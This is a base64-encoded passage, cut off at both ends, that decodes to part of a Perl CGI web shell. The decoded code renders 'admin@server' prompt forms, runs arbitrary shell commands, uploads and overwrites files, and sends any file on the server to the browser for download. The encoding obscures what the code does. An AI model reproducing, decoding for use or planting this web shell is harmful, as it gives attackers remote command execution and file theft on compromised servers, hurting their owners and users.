9ImQiIHZhbHVlPSIkRW5jb2RlQ3VycmVudERpciI+DQokUHJvbXB0DQo8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNDAiIG5hbWU9ImMiIGlkPSJjIj4NCjxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQpFTkQNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gZG93bmxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZpbGVEb3dubG9hZEZvcm0NCnsNCgkkRW5jb2RlQ3VycmVudERpciA9IEVuY29kZURpcigkQ3VycmVudERpcik7DQoJbXkgJGRpciA9ICZBZGRMaW5rRGlyKCJkb3dubG9hZCIpOyANCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJCAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRFbmNvZGVDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+DQokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgY2xhc3M9ImZpbGUiIHR5cGU9InRleHQiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPg0KRG93bmxvYWQ6IDxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQoNCjwvZm9ybT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHVwbG9hZCBmaWxlcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0NCnsNCgkkRW5jb2RlQ3VycmVudERpciA9IEVuY29kZURpcigkQ3VycmVudERpcik7DQoJbXkgJGRpcj0gJkFkZExpbmtEaXIoInVwbG9hZCIpOw0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkICI7DQoJcmV0dXJuIDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQokUHJvbXB0IHVwbG9hZDxicj48YnI+DQpGaWxlbmFtZTogPGlucHV0IGNsYXNzPSJmaWxlIiB0eXBlPSJmaWxlIiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCk9wdGlvbnM6ICZuYnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgaWQ9InVwIiB2YWx1ZT0ib3ZlcndyaXRlIj4NCjxsYWJlbCBmb3I9InVwIj5PdmVyd3JpdGUgaWYgaXQgRXhpc3RzPC9sYWJlbD48YnI+PGJyPg0KVXBsb2FkOiZuYnNwOyZuYnNwOyZuYnNwOzxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEVuY29kZUN1cnJlbnREaXIiPg0KPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9InVwbG9hZCI+DQo8L2Zvcm0+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bw0KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzDQojIG5ldmVyIGNhbGxlZCB3aGVuIHRoZSBzY3JpcHQgaXMgcnVubmluZyBvbiBOVC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBDb21tYW5kVGltZW91dA0Kew0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgkJcmV0dXJuIDw8RU5EOw0KPC90ZXh0YXJlYT4NCjxicj48Zm9udCBjb2xvcj15ZWxsb3c+DQpDb21tYW5kIGV4Y2VlZGVkIG1heGltdW0gdGltZSBvZiAkQ29tbWFuZFRpbWVvdXREdXJhdGlvbiBzZWNvbmQocykuPC9mb250Pg0KPGJyPjxmb250IHNpemU9JzYnIGNvbG9yPXJlZD5LaWxsZWQgaXQhPC9mb250Pg0KRU5EDQoJfQ0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQgY29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcg0KIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gNCiMgZmVhdHVyZSB0aGF0IHN0YXJ0cyB0aGUgZG93bmxvYWQgYXV0b21hdGljYWxseS4NCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludERvd25sb2FkTGlua1BhZ2UNCnsNCglsb2NhbCgkRmlsZVVybCkgPSBAXzsNCglteSAkcmVzdWx0PSIiOw0KCWlmKC1lICRGaWxlVXJsKSAjIGlmIHRoZSBmaWxlIGV4aXN0cw0KCXsNCgkJIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3Nlcg0KCQkkRmlsZVVybCA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJCSREb3dubG9hZExpbmsgPSAiJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZj0kRmlsZVVybCZvPWdvIjsNCgkJJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsNCgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkkcmVzdWx0IC49IDw8RU5EOw0KU2VuZGluZyBGaWxlICRUcmFuc2ZlckZpbGUuLi48YnI+DQoNCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LA0KPGEgaHJlZj0iJERvd25sb2FkTGluayI+Q2xpY2sgSGVyZTwvYT4NCkVORA0KCQkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCX0NCgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0DQoJew0KCQkkcmVzdWx0IC49ICJGYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhIjsNCgkJJHJlc3VsdCAuPSAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlDQojIGJyb3dzZXIsIHNvIHRoYXQgaXQgY2FuIGJlIGRvd25sb2FkZWQgYnkgdGhlIHVzZXIuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBzZW50Lg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFNlbmRGaWxlVG9Ccm93c2VyDQp7DQoJbXkgJHJlc3VsdCA9ICIiOw0KCWxvY2FsKCRTZW5kRmlsZSkgPSBAXzsNCglpZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVkIGZvciByZWFkaW5nDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWJpbm1vZGUoU0VOREZJTEUpOw0KCQkJYmlubW9kZShTVERPVVQpOw0KCQl9DQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOw0KCQkoJEZpbGVuYW1lID0gJFNlbmRGaWxlKSA9fiAgbSEoW14vXlxcXSopJCE7DQoJCXByaW50ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtdW5rbm93blxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7DQoJCXByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOw0KCQlwcmludCB3aGlsZSg8U0VOREZJTEU+KTsNCgkJY2xvc2UoU0VOREZJTEUpOw0KCQlleGl0KDEpOw0KCX0NCgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQ0KCXsNCgkJJHJlc3VsdCAuPSAiRmFpbGVkIHRvIGRvd25sb2FkICRTZW5kRmlsZTogJCEiOw0KCQkkcmVzdWx0IC49JlByaW50RmlsZURvd25sb2FkRm9ybTsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlDQojIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsgdGhyb3VnaCB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMgVGhpcyBmdW5jdGlvbiBpcyBhbHNvIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGNsaWNrcyBvbiB0aGF0IGxpbmsuIEluIHRoaXMgY2FzZSwNCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCZWdpbkRvd25sb2FkDQp7DQoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOw0KCSMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwNCgkJKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQoJew0KCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQoJfQ0KCWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQoJew0KCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCQkkVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCX0NCg0KCWlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQoJew0KCQkmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KCX0NCgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0KCXsNCgkJJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZS4gSWYgdGhlDQojIGZpbGUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQ0KIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBVcGxvYWRGaWxlDQp7DQoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIHVwbG9hZCBmb3JtIGFnYWluDQoJaWYoJFRyYW5zZmVyRmlsZSBlcSAiIikNCgl7DQoJCXJldHVybiAmUHJpbnRGaWxlVXBsb2FkRm9ybTsNCg0KCX0NCglteSAkcmVzdWx0PSIiOw0KCSMgc3RhcnQgdGhlIHVwbG9hZGluZyBwcm9jZXNzDQoJJHJlc3VsdCAuPSAiVXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsNCg0KCSMgZ2V0IHRoZSBmdWxsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGNyZWF0ZWQNCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkkVHJhbnNmZXJGaWxlID1+IG0hKFteL15cXF0qKSQhOw0KCSRUYXJnZXROYW1lIC49ICRQYXRoU2VwLiQxOw0KDQoJJFRhcmdldEZpbGVTaXplID0gbGVuZ3RoKCRpbnsnZmlsZWRhdGEnfSk7DQoJIyBpZiB0aGUgZmlsZSBleGlzdHMgYW5kIHdlIGFyZSBub3Qgc3VwcG9zZWQgdG8gb3ZlcndyaXRlIGl0DQoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpDQoJew0KCQkkcmVzdWx0IC49ICJGYWlsZWQ6IERlc3RpbmF0aW9uIGZpbGUgYWxyZWFkeSBleGlzdHMuPGJyPiI7DQoJfQ0KCWVsc2UgIyBmaWxlIGlzIG5vdCBwcmVzZW50DQoJew0KCQlpZihvcGVuKFVQTE9BREZJTEUsICI+JFRhcmdldE5hbWUiKSkNCgkJew0KCQkJYmlubW9kZShVUExPQURGSUxFKSBpZiAkV2luTlQ7DQoJCQlwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsNCgkJCWNsb3NlKFVQTE9BREZJTEUpOw0KCQkJJHJlc3VsdCAuPSAiVHJhbnNmZXJlZCAkVGFyZ2V0RmlsZVNpemUgQnl0ZXMuPGJyPiI7DQoJCQkkcmVzdWx0IC49ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7DQoJCX0NCgkJZWxzZQ0KCQl7DQoJCQkkcmVzdWx0IC49ICJGYWlsZWQ6ICQhPGJyPiI7DQoJCX0NCgl9DQoJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlbmFtZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluaw0KIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBEb3dubG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCXJldHVybiAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCgkNCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8ICghJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0KCXsNCgkJcmV0dXJuICZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQlyZXR1cm4gJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBleGVjdXRlIGNvbW1hbmRzLiBJdCBkaXNwbGF5cyB0aGUgb3V0cHV0IG9mIHRoZQ0KIyBjb21tYW5kIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgYW5vdGhlciBjb21tYW5kLiBUaGUgY2hhbmdlIGRpcmVjdG9yeQ0KIyBjb21tYW5kIGlzIGhhbmRsZWQgZGlmZmVyZW50bHkuIEluIHRoaXMgY2FzZSwgdGhlIG5ldyBkaXJlY3RvcnkgaXMgc3RvcmVkIGluDQojIGFuIGludGVybmFsIHZhcmlhYmxlIGFuZCBpcyB1c2VkIGVhY2ggdGltZSBhIGNvbW1hbmQgaGFzIHRvIGJlIGV4ZWN1dGVkLiBUaGUNCiMgb3V0cHV0IG9mIHRoZSBjaGFuZ2UgZGlyZWN0b3J5IGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZCB0byB0aGUgdXNlcnMNCiMgdGhlcmVmb3JlIGVycm9yIG1lc3NhZ2VzIGNhbm5vdCBiZSBkaXNwbGF5ZWQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgRXhlY3V0ZUNvbW1hbmQNCnsNCgkkQ3VycmVudERpciA9ICZUcmltU2xhc2hlcygkQ3VycmVudERpcik7DQoJbXkgJHJlc3VsdD0iIjsNCglpZigkUnVuQ29tbWFuZCA9fiBtL15ccypjZFxzKyguKykvKSAjIGl0IGlzIGEgY2hhbmdlIGRpciBjb21tYW5kDQoJew0KCQkjIHdlIGNoYW5nZSB0aGUgZGlyZWN0b3J5IGludGVybmFsbHkuIFRoZSBvdXRwdXQgb2YgdGhlDQoJCSMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLg0KCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7DQoJCWNob21wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7DQoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoNCgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZCA8L3J1bj48YnI+PHRleHRhcmVhIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7DQoJCSMgeHVhdCB0aG9uZyB0aW4ga2hpIGNodXllbiBkZW4gMSB0aHUgbXVjIG5hbyBkbyENCgkJJFJ1bkNvbW1hbmQ9ICRXaW5OVD8iZGlyIjoiZGlyIC1saWEiOw0KCQkkcmVzdWx0IC49ICZSdW5DbWQ7DQoJfWVsc2lmKCRSdW5Db21tYW5kID1+IG0vXlxzKmVkaXRccysoLispLykNCgl7DQoJCSRyZXN1bHQgLj0gICZTYXZlRmlsZUZvcm07DQoJfWVsc2UNCgl7DQoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJCSRyZXN1bHQgLj0gIkNvbW1hbmQ6IDxydW4+JFJ1bkNvbW1hbmQ8L3J1bj48YnI+PHRleHRhcmVhIGlkPSdkYXRhJyBjb2xzPSckY29scycgcm93cz0nJHJvd3MnIHNwZWxsY2hlY2s9J2ZhbHNlJz4iOw0KCQkkcmVzdWx0IC49JlJ1bkNtZDsNCgl9DQoJJHJlc3VsdCAuPSAgIjwvdGV4dGFyZWE+IjsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgcnVuIGNvbW1hbmQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBSdW5DbWQNCnsNCglteSAkcmVzdWx0PSIiOw0KCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4kUnVuQ29tbWFuZC4kUmVkaXJlY3RvcjsNCglpZighJFdpbk5UKQ0KCXsNCgkJJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsNCgkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOw0KCX0NCglpZigkU2hvd0R5bmFtaWNPdXRwdXQpICMgc2hvdyBvdXRwdXQgYXMgaXQgaXMgZ2VuZXJhdGVkDQoJew0KCQkkfD0xOw0KCQkkQ29tbWFuZCAuPSAiIHwiOw0KCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsNCgkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQ0KCQl7DQoJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsNCgkJCSRyZXN1bHQgLj0gJkh0bWxTcGVjaWFsQ2hhcnMoIiRfXG4iKTsNCgkJfQ0KCQkkfD0wOw0KCX0NCgllbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29tbWFuZCBjb21wbGV0ZXMNCgl7DQoJCSRyZXN1bHQgLj0gJkh0bWxTcGVjaWFsQ2hhcnMoJENvbW1hbmQpOw0KCX0NCglpZighJFdpbk5UKQ0KCXsNCgkJYWxhcm0oMCk7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KIyBGb3JtIFNhdmUgRmlsZSANCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCnN1YiBTYXZlRmlsZUZvcm0NCnsNCglteSAkcmVzdWx0ID0iIjsNCgkkRW5jb2RlQ3VycmVudERpciA9IEVuY29kZURpcigkQ3VycmVudERpcik7DQoJc3Vic3RyKCRSdW5Db21tYW5kLDAsNSk9IiI7DQoJbXkgJGZpbGU9JnRyaW0oJFJ1bkNvbW1hbmQpOw0KCSRzYXZlPSc8YnI+PGlucHV0IG5hbWU9ImEiIHR5cGU9InN1Ym1pdCIgdmFsdWU9InNhdmUiIGNsYXNzPSJzdWJtaXQiID4nOw0KCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiRSdW5Db21tYW5kOw0KCW15ICRkaXI9IjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+Ii4mQWRkTGlua0RpcigiZ3VpIikuIjwvc3Bhbj4iOw0KCWlmKC13ICRGaWxlKQ0KCXsNCgkJJHJvd3M9IjIzIg0KCX1lbHNlDQoJew0KCQkkbXNnPSI8YnI+PGZvbnQgc3R5bGU9J2NvbG9yOiB5ZWxsb3c7JyA+IENhbm4ndCB3cml0ZSBmaWxlITxmb250Pjxicj4iOw0KCQkkcm93cz0iMjAiDQoJfQ0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiPGZvbnQgY29sb3I9JyNGRkZGRkYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsNCgkkUnVuQ29tbWFuZCA9ICJlZGl0ICRSdW5Db21tYW5kIjsNCgkkcmVzdWx0IC49ICA8PEVORDsNCgk8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkRW5jb2RlQ3VycmVudERpciI+DQoJJFByb21wdA0KCTxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI0MCIgbmFtZT0iYyI+DQoJPGlucHV0IG5hbWU9InMiIGN